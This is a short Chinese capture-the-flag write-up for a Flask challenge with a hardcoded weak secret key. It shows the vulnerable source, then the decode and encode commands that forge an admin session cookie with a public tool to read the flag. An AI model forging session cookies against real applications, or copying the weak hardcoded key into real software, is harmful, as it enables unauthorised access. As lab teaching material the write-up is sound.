# unsign

​	这道题考点为flask-session伪造。

```python
from flask import Flask, render_template, session, g
import base64
import pickle

app = Flask(__name__)
app.config['SECRET_KEY'] = 'admin123'


@app.route('/')
def show_index():
    if not session.get('role'):
        session['role'] = 'anonymous'

    g.role = session['role']

    if g.role == 'admin':
        g.msg = open('/flag').read()
    else:
        g.msg = 'Only admin can get flag!'

    return render_template('info.html')

app.run('0.0.0.0', 8000)
```

​	拿到加密密钥为admin123，使用工具https://github.com/noraj/flask-session-cookie-manager。

​	初次访问cookie为`eyJyb2xlIjoiYW5vbnltb3VzIn0.aH3e0g.rN4l1S6KfG8xN2yvoa60yLtj9jA`

```shell
python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjoiYW5vbnltb3VzIn0.aH3e0g.rN4l1S6KfG8xN2yvoa60yLtj9jA" -s "admin123"
{'role': 'anonymous'}
```

```shell
python flask_session_cookie_manager3.py encode -t "{'role': 'admin'}" -s "admin123"
eyJyb2xlIjoiYWRtaW4ifQ.aH3jIg.CjV7ebNim3aea3wYjVf_oaWPgFU
```

​	修改cookie后访问直接拿到flag。